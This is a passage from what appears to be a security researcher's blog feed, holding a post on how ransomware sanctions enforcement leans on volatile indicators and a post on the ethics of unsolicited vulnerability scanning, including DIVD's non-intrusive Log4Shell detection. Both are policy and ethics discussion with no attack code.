<p>As I mentioned in the beginning of this article, this post does not argue against the principle of sanctions. It can be a legitimate tool of pressure, deprivation, and deterrence. Rather, it argues that sanctions policy must evolve to strike at the actors it was meant to constrain, not those it was meant to protect. Enforcement that punishes victims through uncertainty does not advance justice; it undermines it.</p>

<h1 id="policy-recommendations-toward-risk-aware-compliance">Policy recommendations: toward risk-aware compliance</h1>
<p>Of course, I am not arguing that we should abandon sanctions policy altogether. Instead, it would be better to propose a more realistic and risk-aware approach:</p>

<ul>
  <li><strong>Recognize the limits of low-level indicators and require corroboration.</strong> Enforcement actions should not hinge on volatile indicators alone. Additional behavioral or contextual evidence should be required to support sanctions-related decisions.</li>
  <li><strong>Promote the development and sharing of behavioral-level CTI.</strong> Encourage public-private sharing of ransomware tradecraft indicators and support open databases that track rebrand linkages, like the U.S. Cybersecurity and Infrastructure Security Agency’s (CISA) <a href="https://www.cisa.gov/stopransomware">#StopRansomware campaign</a>, where they share observed indicators from various organizations.</li>
  <li><strong>Establish a cross-sector CTI clearing house.</strong> All 20 experts we interviewed independently called for a neutral, non-commercial platform to consolidate and curate ransomware attribution data. No single entity today has the necessary scope or trust to do this alone.</li>
  <li><strong>Introduce proportionality and good-faith standards</strong> in compliance enforcement. If a victim acted on available information and had no access to classified or high-confidence attribution, they should be protected instead of penalized anywhere.</li>
  <li><strong>Improve transparency of sanctions intelligence.</strong> Where governments establish control or continuity between groups, this information should be shared with defenders, not just for enforcement.</li>
</ul>

<p>These are not radical departures from current policy. They are adjustments grounded in the technical and operational realities of the ransomware ecosystem.</p>

<h1 id="conclusion-enforcement-should-follow-evidence-not-assumption">Conclusion: enforcement should follow evidence, not assumption</h1>
<p>Sanctions are a legitimate tool of deterrence. But in the ransomware context, their enforcement often assumes more clarity and certainty than defenders and victims actually possess. Attribution is rarely unambiguous. Indicators change, groups rebrand, and intelligence arrives too late to guide real-time decisions. Current enforcement frameworks place responsibility on victims to act with <em>perfect foresight</em> in an environment defined by uncertainty. This doesn’t advance justice—it undermines it.</p>

<p>If policy is to support resilience rather than amplify harm, it must reflect how threat intelligence actually works. That means supporting enforcement with persistent, behavioral signals rather than fragile, low-level ones. It also means ensuring that all parties involved have access to the same information. It means recognizing the asymmetries between attackers who can vanish and reappear at will, and defenders who are left to navigate compliance obligations in the dark.</p>

<p>We can’t sanction what we can’t see. And we shouldn’t punish those who were never the intended target.</p>]]></content><author><name>Max van der Horst</name><email>mhvanderhorst@tudelft.nl</email></author><category term="Cybersecurity Policy &amp; Ethics" /><category term="Observations on Cyber Threat Intelligence" /><category term="Research Process" /><summary type="html"><![CDATA[When I worked in a Computer Emergency Response Team (CERT), ransomware cases were part of the routine. A company would be hit, backups failed, and the question of ransom payment would come up. Every so often, the team would offer the option of a sanction checking service to verify whether payment was even legal. However, these sanction checks would depend on indicators like cryptocurrency wallet addresses, file hashes, IP addresses, and domain names. These were all indicators that were known to be volatile, so I wondered: how effective is this really?. These checks felt necessary but rarely brought clarity. Infrastructure changed constantly. Attribution was fragile and full of assumptions, and the same group might be known under a different name next week. Even when the style of a ransomware operation was recognized, it didn’t guarantee that we could connect it to a known actor. The attacker would disappear after the ransom payment, but the legal and financial risk remained, now shifted onto the victim. That discomfort stuck with me. So when I had the opportunity to start working on the paper this post is based on, it wasn’t just about the fragility of different Indicators of Compromise (IoCs). It was about something deeper: what happens when policy assumes a level of certainty that defenders simply don’t have? This blogpost is an extension of the USENIX paper: a reflection on how our current enforcement and compliance frameworks place responsibility on those with the least access to reliable information. It is not a call to weaken sanctions policy, but a call to make it more just. If sanctions are meant to constrain attackers, then enforcement must be designed to reach them–not to retroactively penalize the victims. The limits of technical attribution In Threat Intelligence, attribution is a layered process. Low-level IoCs, pieces of evidence related to infrastructure, the attack, payment methods, and other operational details, are easy to collect and useful for detection. However, they are extremely volatile. These indicators can be changed with little effort by attackers, making them poor foundations for long-term attributions. This idea has been confirmed by frameworks like Bianco’s Pyramid of Pain and Rid and Buchanan’s Q-Model. Hence, it seems irresponsible to base sanctions lists on these low-level indicators, which is why the paper behind this post investigates the value of high-level IoCs. By contrast, high-level IoCs capture behavioral traits such as how attackers deploy their malware, how they move laterally, ransom note linguistics, negotiation attitudes, and Tactics, Techniques, and Procedures (TTPs). Both models agree that high-level indicators are more resilient to evasion and thus more trustworthy across rebrandings. Figures 1 &amp; 2: The Pyramid of Pain and the Q-Model The affiliate wild-card Many ransomware operations follow an affiliate model known as Ransomware-as-a-Service (RaaS), in which core developers lease their tools to independent partners. These affiliates vary widely in skill and methods, and while operators often provide deployment guidelines, affiliates may diverge from them in practice. As a result, high-level indicators, such as lateral movement techniques or tooling preferences, can differ significantly even within the same group, adding noise to attribution efforts. Observations from the paper We analysed datasets containing information on ransomware incidents: 27 private incident reports from an incident response company and 13 public CISA advisories based on various other incident response organizations. Two findings stood out from this data: Figure 3: Similarity metrics across ransomware groups Inside a single “brand,” the technical overlap was surprisingly low. Different incidents linked to the same group often shared fewer than half their TTPs. Across sources, the overlaps became even lower. What CISA published and what the responders from our partnering company observed for the same group only line up part of the time. This shows a significant discrepancy between the reporting of different organizations, which undermines the assumption that defenders (or regulators) have access to a consistent view of attacker behaviour at the time sanctions checks are performed. In short, the low-level indicators that sanctions lists currently lean on tend to expire quickly, while no one seems to have a comprehensive overview of the behavioural high-level indicators. While this dataset is of course not exhaustive, the consistency of these patterns across both public and private reporting streams underscores their broader relevance. Why this matters for sanctions Yet, most compliance frameworks, and even some insurance policies, continue to rely on indicators that appear to uniquely identify a ransomware group. This is an understandable position: enforcement systems require clear identifiers to function. However, this expectation favors indicators that are easily assigned over indicators that are more stable but less individually distinctive. As a result, and as confirmed by our interviewees, high-level behavioural indicators are often excluded from compliance checks, not because they are unreliable, but because they lack the singularity needed to support legal or financial action. Sanctions enforcement, therefore, depends on low-level indicators not due to their robustness, but because they are uniquely attributable. This is true even when those same indicators can be changed by attackers with minimal effort. Until enforcement frameworks find a way to operationalise high-level signals across rebrandings, defenders will have to deal with indicators that are known to change rapidly. In practice, this means working with the most accessible signals, not the most meaningful ones. Rebranding as a sanctions-evasion strategy Ransomware groups don’t stay still. After public exposure, internal conflict, or sanctions, many simply dissolve and rebrand under a new name. The infamous Conti group, for instance, splintered into several new entities, including Royal and then BlackSuit, among others. These new groups often adopt new infrastructure, names, leak sites, and negotiation portals, but retain (some of) the same personnel, malware toolchains, and affiliate relationships. This rebranding breaks the link between old and new entities in legal and public intelligence contexts. While threat researchers may recognize the continuity, governments may typically require formal evidence of control or ownership to link a new group to a sanctioned predecessor. That process is slow, often opaque, and rarely public. Months can pass before rebranded groups are re-sanctioned, during which victims remain legally exposed. Victims, meanwhile, are expected to know better. If they pay a ransom to a group that is later tied to a sanctioned actor, they may be penalized, even if the link was not publicly known at the time of payment. Various interviewees in the study mentioned this to be a great risk to the victim, as insurers can (and will) try to claw back a paid-out ransom months later if the recipient is sanctioned after the fact, effectively retro-dating the exclusion to the payment date. Moreover, the moment a ransomware group is sanctioned, it may trigger a rebrand, further obfuscating the public overview. This is the heart of the policy asymmetry: ransomware groups can easily obscure their identities whereas defenders and victims are expected to see through the smoke. The information deficit and the burden of compliance This means that the position that a victim of ransomware finds themselves in can be framed as an information deficit. The entities responsible for enforcing compliance, such as governments, regulators, and insurers, operate on the assumption that attribution is clear and actionable. However, in ransomware cases, attribution is often incomplete, delayed, or ambiguous. The ransomware cases we’ve analyzed in our study show that low-level indicators rarely persisted across incidents, let alone rebrandings. In several cases, ransom payments were made to groups not publicly sanctioned at the time, only for links to sanctioned actors to emerge through later intelligence analysis. These links often relied on high-level behavior indicators like linguistics, panel design reuse, or TTPs, which were absent from standard sanction checks. This creates a critical gap: compliance decisions are expected to be based on indicators that are technically available but operationally unreliable. Meanwhile, indicators that could offer stronger attribution are often not included in threat feeds or sanctions designations, and are not legally recognized as sufficient evidence. Furthermore, because of phenomena like the Ransomware-as-a-Service (RaaS) ecosystem, slight deviations in reporting using frameworks like the MITRE ATT&amp;CK Matrix, and the commercialisation of the Threat Intelligence industry, data is so fragmented that no single organization appears to have a comprehensive view of high-level indicators, making coordinated enforcement even more difficult. This also means that even when TTP combinations appear distinctive on paper, the fragmentation and inconsistency across sources make them impractical for real-world sanctions checks. In practice, this means that defenders may act in good faith based on the best available data and still find themselves in violation of compliance expectations. While European countries are typically more forgiving than the U.S. by taking into account their Best Efforts regulation, payment to a sanctioned entity still opens up a victim to legal or financial consequences. Several European and American cyber-insurance wordings now not only exclude reimbursement for ransoms that benefit a sanctioned party, but also reserve the right to recover a payout after the fact if new intelligence or a late-issued designation reveals that the attackers were sanctioned. Retroactive enforcement of these exclusions, whether via contract or regulation, shifts the risk back onto those least equipped to verify attribution in real time: the victims. Structural asymmetry in ransomware enforcement The outcome is a deeply asymmetrical system. Attackers operate in a fluid, pseudonymous ecosystem. Defenders operate under legal obligations, audit trails, and policy scrutiny. Compliance rules are often applied rigidly. Not only by governments, but increasingly by cyber insurers, even when the available indicators are ambiguous. Our research calls attention to this structural misalignment. It is not simply a technical issue, but a policy failure. By placing the burden of accurate attribution on defenders, we ignore the reality that attribution is contested and delayed, even among experts. As I mentioned in the beginning of this article, this post does not argue against the principle of sanctions. It can be a legitimate tool of pressure, deprivation, and deterrence. Rather, it argues that sanctions policy must evolve to strike at the actors it was meant to constrain, not those it was meant to protect. Enforcement that punishes victims through uncertainty does not advance justice; it undermines it. Policy recommendations: toward risk-aware compliance Of course, I am not arguing that we should abandon sanctions policy altogether. Instead, it would be better to propose a more realistic and risk-aware approach: Recognize the limits of low-level indicators and require corroboration. Enforcement actions should not hinge on volatile indicators alone. Additional behavioral or contextual evidence should be required to support sanctions-related decisions. Promote the development and sharing of behavioral-level CTI. Encourage public-private sharing of ransomware tradecraft indicators and support open databases that track rebrand linkages, like the U.S. Cybersecurity and Infrastructure Security Agency’s (CISA) #StopRansomware campaign, where they share observed indicators from various organizations. Establish a cross-sector CTI clearing house. All 20 experts we interviewed independently called for a neutral, non-commercial platform to consolidate and curate ransomware attribution data. No single entity today has the necessary scope or trust to do this alone. Introduce proportionality and good-faith standards in compliance enforcement. If a victim acted on available information and had no access to classified or high-confidence attribution, they should be protected instead of penalized anywhere. Improve transparency of sanctions intelligence. Where governments establish control or continuity between groups, this information should be shared with defenders, not just for enforcement. These are not radical departures from current policy. They are adjustments grounded in the technical and operational realities of the ransomware ecosystem. Conclusion: enforcement should follow evidence, not assumption Sanctions are a legitimate tool of deterrence. But in the ransomware context, their enforcement often assumes more clarity and certainty than defenders and victims actually possess. Attribution is rarely unambiguous. Indicators change, groups rebrand, and intelligence arrives too late to guide real-time decisions. Current enforcement frameworks place responsibility on victims to act with perfect foresight in an environment defined by uncertainty. This doesn’t advance justice—it undermines it. If policy is to support resilience rather than amplify harm, it must reflect how threat intelligence actually works. That means supporting enforcement with persistent, behavioral signals rather than fragile, low-level ones. It also means ensuring that all parties involved have access to the same information. It means recognizing the asymmetries between attackers who can vanish and reappear at will, and defenders who are left to navigate compliance obligations in the dark. We can’t sanction what we can’t see. And we shouldn’t punish those who were never the intended target.]]></summary></entry><entry><title type="html">Unsolicited but Ethical: Threshold Deontology in Public Interest Vulnerability Disclosure</title><link href="http://localhost:4000/2025/05/10/unsolicited-vulnerability-disclosure-ethics.html" rel="alternate" type="text/html" title="Unsolicited but Ethical: Threshold Deontology in Public Interest Vulnerability Disclosure" /><published>2025-05-10T00:00:00+02:00</published><updated>2025-05-10T00:00:00+02:00</updated><id>http://localhost:4000/2025/05/10/unsolicited-vulnerability-disclosure-ethics</id><content type="html" xml:base="http://localhost:4000/2025/05/10/unsolicited-vulnerability-disclosure-ethics.html"><![CDATA[<p>I often send emails to people I’ve never met, about systems they didn’t know were vulnerable, warning them about risks they never asked me to find. Often, they’re surprised. Mostly grateful. Occasionally hostile.</p>

<p>I can understand the discomfort. On the surface, without more in-depth knowledge, it can feel intrusive. Who asked me to scan their infrastructure? Who gave me permission to notify them about something they didn’t request? I’ve come to realize that in cybersecurity, waiting for consent isn’t always an ethical luxury we can afford. Sometimes, when a vulnerability threatens publicly accessible systems, the consequences of inaction quickly outweigh the social comfort of protocol.</p>

<h1 id="ethics-of-vulnerability-disclosure">Ethics of Vulnerability Disclosure</h1>
<p>At the <a href="https://divd.nl">Dutch Institute for Vulnerability Disclosure</a>, I work in a team that operates in that uncomfortable space between respecting boundaries and preventing harm. It’s not a line we walk casually, and one I’ve learned to approach with both caution and conviction. That’s why, at DIVD, we rely on a shared <a href="https://divd.nl/code">Code of Conduct</a> (CoC). This CoC is derived from a <a href="https://www.om.nl/documenten/richtlijnen/2020/december/14/om-beleidsbrief-ethisch-hacken#:~:text=Het%20Openbaar%20Ministerie%20heeft%20in,tegen%20een%20ethische%20hacker%20binnenkomt.">policy</a> that was published by the Dutch Public Prosecutor in 2020, which describes the circumstances under which computer hacking will be considered ethical and exempt from prosecution. This policy is based on years of debate and legal jurisprudence and has served the Dutch hacker community greatly up until now. The questions it provides to determine whether or not an action is ethical are as follows:</p>

<ul>
  <li>Was the action taken in the context of a significant public interest?</li>
  <li>Was the conduct proportionate (i.e., did the suspect not go further than necessary to achieve their objective)?</li>
  <li>Was the requirement of subsidiarity met (i.e., were there no less intrusive means available to achieve the intended objective)?</li>
</ul>

<p>The DIVD CoC guides our decisions to make sure we do not cross any ethical boundaries. This can get knotty quite quickly, as we attempt to locate everyone worldwide that may be vulnerable to a particular security vulnerability. Therefore we have to make well-thought-through decisions when it comes to worldwide vulnerability scans: we have to be sure that we do not intrude further than necessary and that our way of scanning is the least impactful one.</p>

<p>I’ve found myself to be increasingly exacting about this. If a scan doesn’t meet the ethical standards we’ve committed to at DIVD, it’s not uncommon to argue against executing it–even if that means walking away from a serious case. That may seem cautious, but it raises a deeper ethical question: When is a vulnerability severe enough that inaction becomes the more problematic choice?</p>

<p>This post argues that the ethical frameworks implicitly used by DIVD, particularly threshold deontology, provide a defensible basis for more intrusive forms of unsolicited vulnerability disclosure when the public interest is at stake.</p>

<h1 id="when-inaction-becomes-the-problem">When inaction becomes the problem</h1>
<p>Ethics in the computer security landscape have always been a topic of discussion. Recently, this discussion seems to have picked up in the academic world around the three leading frameworks and their respective ideologies:</p>

<ul>
  <li><strong>Consequentialism:</strong> Actions are morally right if it leads to the best overall outcomes or consequences. The use of consequentialism in this article mostly resembles utilitarianism, which is a type of consequentialism that focuses on the well-being of people.</li>
  <li><strong>Deontology:</strong> Actions are morally right if it follows a set of moral rules or duties, regardless of the outcome.</li>
  <li><strong>Virtue Ethics:</strong> Actions are morally right if it reflects the character and virtues of a good or morally exemplary person.</li>
</ul>

<p>While equally important, this post does not focus on virtue ethics. The challenge we face in Coordinated Vulnerability Disclosure is not about judging moral character. It’s about operationalizing structured processes, making ethically defensible decisions under pressure, and balancing duties with consequences. These are domains where rules and outcomes matter more directly than personal virtue.</p>

<p>This is confirmed by various studies in the academic landscape such as <a href="https://www.dhs.gov/sites/default/files/publications/CSD-MenloPrinciplesCORE-20120803_1.pdf">The Menlo Report</a> and the (more recent) study on <a href="https://www.usenix.org/system/files/usenixsecurity23-kohno.pdf">Computer Security Trolley Problems</a> by Kohno et al. These studies emphasize the importance of consequentialism and deontology where they intentionally leave virtue ethics out of scope. In contrast, studies of cybercrime — where intent, personal responsibility, and moral development are central — often lean more heavily on virtue ethics.</p>

<p>The tension between doing what’s right according to principle and doing what’s necessary to prevent harm lies at the center of many dilemmas in computer security. Deontology and consequentialism are often seen as opposites that lead to different outcomes when applied to the same case studies, leading these case studies to be seen as moral dilemmas. For this reason, one may realise that an absolutist approach to either of these frameworks may not be sufficient in practice when the intent is preventing harm. The Stanford Encyclopedia of Philosophy emphasizes this limitation by describing a balance through what is known as <a href="https://plato.stanford.edu/entries/ethics-deontological/#DeoRelConRec">threshold deontology</a>. Threshold deontology begins with a commitment to deontological principles such as minimizing intrusion and acting transparently. However, it recognizes that these rules may need to be overridden when the potential harm of inaction crosses a critical threshold. In other words:</p>

<blockquote>
  <p>We follow the rules, until not following them becomes the more ethical choice.</p>
</blockquote>

<p>Threshold deontology doesn’t abandon principles. It does, however, ask us to honor them until the consequences of strict adherence become morally unacceptable, to then act with caution for a societal cause.</p>

<h1 id="principles-in-practice">Principles in practice</h1>
<p>But how would we know when that threshold is actually crossed? Threshold deontology provides us with the ‘philosophical permission’ to override a duty, but it doesn’t say when exactly that override is justified. This is where the principlist framework can provide some guidance. Instead of relying on a single guiding rule, it asks us to weigh multiple ethical principles that often come into tension in practice. This helps us to assess not just whether an action is justified, but also why and what ethical trade-offs we are accepting in the process.</p>

<p>In 2021, Formosa et al. proposed <a href="https://www.sciencedirect.com/science/article/pii/S0167404821002066">a principlist framework</a> for cybersecurity that is composed of the following five principles:</p>

<ul>
  <li><strong>Beneficence:</strong> Promote well-being and prevent harm</li>
  <li><strong>Non-maleficence</strong>: Avoid causing harm</li>
  <li><strong>Autonomy:</strong> Respect individuals’ control over their systems and data</li>
  <li><strong>Justice:</strong> Ensure fairness and equitable treatment</li>
  <li><strong>Explicability:</strong> Act transparently and be accountable</li>
</ul>

<p>Formosa’s principlist framework is derived from Beauchamp and Childress’s <a href="https://jme.bmj.com/content/28/5/332.2">“Four Principles” of biomedical ethics</a> and added a fifth principle of explicability, which is drawn from <a href="https://link.springer.com/article/10.1007/s11023-018-9482-5">AI ethics</a> (Floridi et al., 2018). When we’re considering something like a global vulnerability scan, these principles help us structure our ethical reasoning. DIVD’s scanning decisions are centered on the principle of beneficence: the obligation to prevent harm and promote public safety. When the potential benefit of scanning is low, for example when a vulnerability poses little risk or is unlikely to be exploited, we hold firm to the non-maleficence (avoiding harm) and autonomy (respecting consent and responsibility) principles. In such cases, we will refrain from scanning because the ethical cost outweighs the limited benefit.</p>

<p>However, when the potential to prevent significant harm is high, such as when a vulnerability threatens large-scale exploitation or critical infrastructure, we may override non-maleficence and autonomy in service of that benefit. This is not a decision taken lightly. It reflects a careful ethical trade-off, where the duty to protect others justifies limited, well-controlled intrusion.</p>

<h1 id="how-wide-is-my-fingerprint">How WIDE is my fingerprint?</h1>
<p>To teach others about fingerprinting ethics, I often use a simple heuristic to assess the moral footprint of a fingerprinting technique called WIDE. It helps to bring down a fingerprint to the bare minimum and subjects it to the requirements of an ethical scanning methodology. WIDE stands for:</p>

<ul>
  <li><strong>Weaponized:</strong> Could this scanning methodology be used to (enable) harm? Or more practical: if the scanning methodology involves a public Proof of Concept, does it contain any malware that we would need to neutralize first? This reflects the principle of non-maleficence.</li>
  <li><strong>Intrusive:</strong> Does this scanning methodology cross any boundaries of consent, privacy, or proportionality? Does it leave any unnecessary traces on the target system? This brings autonomy and justice into view.</li>
  <li><strong>Deweaponized:</strong> Is this scanning methodology deliberately designed to reduce its exploitability and intrusiveness as far as possible? This ties to beneficence, the duty to protect.</li>
  <li><strong>Ethical:</strong> Would this technique hold up under scrutiny from others? Is it proportionate and according to subsidiarity standards? Here, explicability becomes essential to ensure transparency on decisions and reasoning.</li>
</ul>

<p><img src="../../../assets/WIDE_heuristic_diagram_darkbg.svg" alt="" /></p>

<p>When I ask myself, <em>“How WIDE is this fingerprint?”</em>, I’m not answering a closed question. I’m surfacing tensions. Even techniques that appear technically harmless can become ethically problematic if used carelessly, at scale, or without transparency. WIDE isn’t a substitute for principlism, but it does help bring the principles into everyday practice when it comes to operationalizing a scanning methodology. It’s a kind of ethical gut check for ethical proportionality: quick, imperfect, but useful when decisions happen fast. Of course, ethics are subjective, which is why not everyone may agree with our framing. Especially when consent is missing, ethical objections matter.</p>

<h1 id="addressing-ethical-objections">Addressing ethical objections</h1>
<p>There are some <a href="https://www.hup.harvard.edu/books/9780674976009">counterarguments to unsolicited scanning</a>, such as concerns about overreach, digital trespassing, and the potential erosion of trust in security research. In the end, if subjectivity leads to the justification of compromising on the explicability principle, ethical boundaries are allowed to shift under pressure. How do we ensure they don’t shift too far?</p>

<p>These are legitimate concerns. However, this is exactly why it is important to rely on structured frameworks like threshold deontology and principlism: not to escape ethical boundaries, but to make these boundaries visible, contestable, and constrained. The point isn’t that anything is allowed when societal safety is at play. It’s that sometimes, doing nothing carries a greater ethical cost than acting carefully without permission.</p>

<h1 id="the-public-interest-threshold-of-log4shell">The public interest threshold of Log4Shell</h1>
<p>When <a href="https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance">Log4Shell</a> was disclosed in late 2021, it posed a severe threat to global digital infrastructure. The vulnerability affected countless systems, many of which were unknown to be using this software, and exploitation began within hours of public disclosure as it was trivial to exploit. It became clear quickly that this vulnerability didn’t just pose a theoretical risk, but a real-world crisis.</p>

<p>Log4J, the vulnerable software, was a logging component embedded in many other systems, making this a supply chain issue. The team at DIVD working on this case then faced a difficult question: how to responsibly notify affected organizations across the globe, many of which had no idea they were even using Log4J?</p>

<p>In such a high-stakes context, the threshold for ethical intervention was clearly crossed. The potential for harm was immense, as this vulnerability could lead to ransomware, data breaches, and critical infrastructure failures, disrupting society on a large scale. Because Log4J was embedded in other software rather than a standalone component, scanning was not possible without triggering the vulnerability itself. The considerations central to the WIDE heuristic helped to assess this approach: where many actors were mass-exploiting systems at random to test for the vulnerability, DIVD’s scanning methodology was deliberately deweaponized to reduce exploitability and kept as non-intrusive as possible by avoiding persistence or harmful effects.</p>

<p>To achieve this, DIVD created a Log4Shell exploit that triggered a single DNS request to a <a href="https://www.canarytokens.org/nest/">Canary Token</a> from inside the vulnerable system: an approach that was harmless and, of all options, the least intrusive. It only revealed the vulnerable IP address and nothing more. The actions taken were designed to be ethical: proportionate to the risk, grounded in subsidiarity, and subject to public scrutiny. In doing so, we aimed to maximize beneficence, minimize maleficence, respect justice, and uphold explicability—even where autonomy had to be limited for the sake of public safety.</p>

<h1 id="conclusion-trust-through-transparent-ethics">Conclusion: Trust through transparent ethics</h1>
<p>Coordinated Vulnerability Disclosure isn’t just a technical challenge: it’s an ethical one. At DIVD, we don’t treat unsolicited scanning and disclosure as a loophole or an afterthought. We treat it as an action that requires justification, restraint, and transparency.</p>

<p>Threshold deontology provides us with the ethical architecture to act decisively when society is at risk. The principlist framework implicitly helps us navigate that threshold with clarity, so we’re not acting on instinct, but on structured ethical reasoning. I’m sharing this to explain how I think about the ethics behind unsolicited disclosure. Not because we see ourselves as above ethical rules at DIVD, but because we try to follow them as rigorously as possible, even when the path forward isn’t obvious.</p>]]></content><author><name>Max van der Horst</name><email>mhvanderhorst@tudelft.nl</email></author><category term="Cybersecurity Policy &amp; Ethics" /><category term="Vulnerability Disclosure" /><summary type="html"><![CDATA[I often send emails to people I’ve never met, about systems they didn’t know were vulnerable, warning them about risks they never asked me to find. Often, they’re surprised. Mostly grateful. Occasionally hostile. I can understand the discomfort. On the surface, without more in-depth knowledge, it can feel intrusive. Who asked me to scan their infrastructure? Who gave me permission to notify them about something they didn’t request? I’ve come to realize that in cybersecurity, waiting for consent isn’t always an ethical luxury we can afford. Sometimes, when a vulnerability threatens publicly accessible systems, the consequences of inaction quickly outweigh the social comfort of protocol. Ethics of Vulnerability Disclosure At the Dutch Institute for Vulnerability Disclosure, I work in a team that operates in that uncomfortable space between respecting boundaries and preventing harm. It’s not a line we walk casually, and one I’ve learned to approach with both caution and conviction. That’s why, at DIVD, we rely on a shared Code of Conduct (CoC). This CoC is derived from a policy that was published by the Dutch Public Prosecutor in 2020, which describes the circumstances under which computer hacking will be considered ethical and exempt from prosecution. This policy is based on years of debate and legal jurisprudence and has served the Dutch hacker community greatly up until now. The questions it provides to determine whether or not an action is ethical are as follows: Was the action taken in the context of a significant public interest? Was the conduct proportionate (i.e., did the suspect not go further than necessary to achieve their objective)? Was the requirement of subsidiarity met (i.e., were there no less intrusive means available to achieve the intended objective)? The DIVD CoC guides our decisions to make sure we do not cross any ethical boundaries. This can get knotty quite quickly, as we attempt to locate everyone worldwide that may be vulnerable to a particular security vulnerability. Therefore we have to make well-thought-through decisions when it comes to worldwide vulnerability scans: we have to be sure that we do not intrude further than necessary and that our way of scanning is the least impactful one. I’ve found myself to be increasingly exacting about this. If a scan doesn’t meet the ethical standards we’ve committed to at DIVD, it’s not uncommon to argue against executing it–even if that means walking away from a serious case. That may seem cautious, but it raises a deeper ethical question: When is a vulnerability severe enough that inaction becomes the more problematic choice? This post argues that the ethical frameworks implicitly used by DIVD, particularly threshold deontology, provide a defensible basis for more intrusive forms of unsolicited vulnerability disclosure when the public interest is at stake. When inaction becomes the problem Ethics in the computer security landscape have always been a topic of discussion. Recently, this discussion seems to have picked up in the academic world around the three leading frameworks and their respective ideologies: Consequentialism: Actions are morally right if it leads to the best overall outcomes or consequences. The use of consequentialism in this article mostly resembles utilitarianism, which is a type of consequentialism that focuses on the well-being of people. Deontology: Actions are morally right if it follows a set of moral rules or duties, regardless of the outcome. Virtue Ethics: Actions are morally right if it reflects the character and virtues of a good or morally exemplary person. While equally important, this post does not focus on virtue ethics. The challenge we face in Coordinated Vulnerability Disclosure is not about judging moral character. It’s about operationalizing structured processes, making ethically defensible decisions under pressure, and balancing duties with consequences. These are domains where rules and outcomes matter more directly than personal virtue. This is confirmed by various studies in the academic landscape such as The Menlo Report and the (more recent) study on Computer Security Trolley Problems by Kohno et al. These studies emphasize the importance of consequentialism and deontology where they intentionally leave virtue ethics out of scope. In contrast, studies of cybercrime — where intent, personal responsibility, and moral development are central — often lean more heavily on virtue ethics. The tension between doing what’s right according to principle and doing what’s necessary to prevent harm lies at the center of many dilemmas in computer security. Deontology and consequentialism are often seen as opposites that lead to different outcomes when applied to the same case studies, leading these case studies to be seen as moral dilemmas. For this reason, one may realise that an absolutist approach to either of these frameworks may not be sufficient in practice when the intent is preventing harm. The Stanford Encyclopedia of Philosophy emphasizes this limitation by describing a balance through what is known as threshold deontology. Threshold deontology begins with a commitment to deontological principles such as minimizing intrusion and acting transparently. However, it recognizes that these rules may need to be overridden when the potential harm of inaction crosses a critical threshold. In other words: We follow the rules, until not following them becomes the more ethical choice. Threshold deontology doesn’t abandon principles. It does, however, ask us to honor them until the consequences of strict adherence become morally unacceptable, to then act with caution for a societal cause. Principles in practice But how would we know when that threshold is actually crossed? Threshold deontology provides us with the ‘philosophical permission’ to override a duty, but it doesn’t say when exactly that override is justified. This is where the principlist framework can provide some guidance. Instead of relying on a single guiding rule, it asks us to weigh multiple ethical principles that often come into tension in practice. This helps us to assess not just whether an action is justified, but also why and what ethical trade-offs we are accepting in the process. In 2021, Formosa et al. proposed a principlist framework for cybersecurity that is composed of the following five principles: Beneficence: Promote well-being and prevent harm Non-maleficence: Avoid causing harm Autonomy: Respect individuals’ control over their systems and data Justice: Ensure fairness and equitable treatment Explicability: Act transparently and be accountable Formosa’s principlist framework is derived from Beauchamp and Childress’s “Four Principles” of biomedical ethics and added a fifth principle of explicability, which is drawn from AI ethics (Floridi et al., 2018). When we’re considering something like a global vulnerability scan, these principles help us structure our ethical reasoning. DIVD’s scanning decisions are centered on the principle of beneficence: the obligation to prevent harm and promote public safety. When the potential benefit of scanning is low, for example when a vulnerability poses little risk or is unlikely to be exploited, we hold firm to the non-maleficence (avoiding harm) and autonomy (respecting consent and responsibility) principles. In such cases, we will refrain from scanning because the ethical cost outweighs the limited benefit. However, when the potential to prevent significant harm is high, such as when a vulnerability threatens large-scale exploitation or critical infrastructure, we may override non-maleficence and autonomy in service of that benefit. This is not a decision taken lightly. It reflects a careful ethical trade-off, where the duty to protect others justifies limited, well-controlled intrusion. How WIDE is my fingerprint? To teach others about fingerprinting ethics, I often use a simple heuristic to assess the moral footprint of a fingerprinting technique called WIDE. It helps to bring down a fingerprint to the bare minimum and subjects it to the requirements of an ethical scanning methodology. WIDE stands for: Weaponized: Could this scanning methodology be used to (enable) harm? Or more practical: if the scanning methodology involves a public Proof of Concept, does it contain any malware that we would need to neutralize first? This reflects the principle of non-maleficence. Intrusive: Does this scanning methodology cross any boundaries of consent, privacy, or proportionality? Does it leave any unnecessary traces on the target system? This brings autonomy and justice into view. Deweaponized: Is this scanning methodology deliberately designed to reduce its exploitability and intrusiveness as far as possible? This ties to beneficence, the duty to protect. Ethical: Would this technique hold up under scrutiny from others? Is it proportionate and according to subsidiarity standards? Here, explicability becomes essential to ensure transparency on decisions and reasoning. When I ask myself, “How WIDE is this fingerprint?”, I’m not answering a closed question. I’m surfacing tensions. Even techniques that appear technically harmless can become ethically problematic if used carelessly, at scale, or without transparency. WIDE isn’t a substitute for principlism, but it does help bring the principles into everyday practice when it comes to operationalizing a scanning methodology. It’s a kind of ethical gut check for ethical proportionality: quick, imperfect, but useful when decisions happen fast. Of course, ethics are subjective, which is why not everyone may agree with our framing. Especially when consent is missing, ethical objections matter. Addressing ethical objections There are some counterarguments to unsolicited scanning, such as concerns about overreach, digital trespassing, and the potential erosion of trust in security research. In the end, if subjectivity leads to the justification of compromising on the explicability principle, ethical boundaries are allowed to shift under pressure. How do we ensure they don’t shift too far? These are legitimate concerns. However, this is exactly why it is important to rely on structured frameworks like threshold deontology and principlism: not to escape ethical boundaries, but to make these boundaries visible, contestable, and constrained. The point isn’t that anything is allowed when societal safety is at play. It’s that sometimes, doing nothing carries a greater ethical cost than acting carefully without permission. The public interest threshold of Log4Shell When Log4Shell was disclosed in late 2021, it posed a severe threat to global digital infrastructure. The vulnerability affected countless systems, many of which were unknown to be using this software, and exploitation began within hours of public disclosure as it was trivial to exploit. It became clear quickly that this vulnerability didn’t just pose a theoretical risk, but a real-world crisis. Log4J, the vulnerable software, was a logging component embedded in many other systems, making this a supply chain issue. The team at DIVD working on this case then faced a difficult question: how to responsibly notify affected organizations across the globe, many of which had no idea they were even using Log4J? In such a high-stakes context, the threshold for ethical intervention was clearly crossed. The potential for harm was immense, as this vulnerability could lead to ransomware, data breaches, and critical infrastructure failures, disrupting society on a large scale. Because Log4J was embedded in other software rather than a standalone component, scanning was not possible 